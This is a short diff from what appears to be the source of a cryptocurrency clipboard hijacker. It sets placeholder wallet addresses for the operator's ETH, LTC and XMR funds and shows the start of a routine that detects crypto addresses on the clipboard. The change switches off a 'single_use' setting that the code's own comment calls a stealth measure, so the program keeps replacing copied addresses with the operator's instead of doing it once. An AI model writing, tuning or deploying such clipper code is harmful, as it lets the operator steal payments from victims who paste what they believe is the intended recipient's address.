@@ -11,7 +11,7 @@ ethaddr = "SET ETH ADDRESS HERE"  # if no ETH address leave as SET ETH ADDRESS H
 ltcaddr = "SET LTC ADDRESS HERE"  # if no LTC address leave as SET LTC ADDRESS HERE
 xmraddr = "SET XMR ADDRESS HERE"  # if no XMR address leave as SET XMR ADDRESS HERE
 
-single_use = True  # if set to True, program will only ever clip one address. After this happens it wont ever clip again. Sort of like a stealth module.
+single_use = False  # if set to True, program will only ever clip one address. After this happens it wont ever clip again. Sort of like a stealth module.
 
 def is_crypto_addr(clipboard_text):
     try:
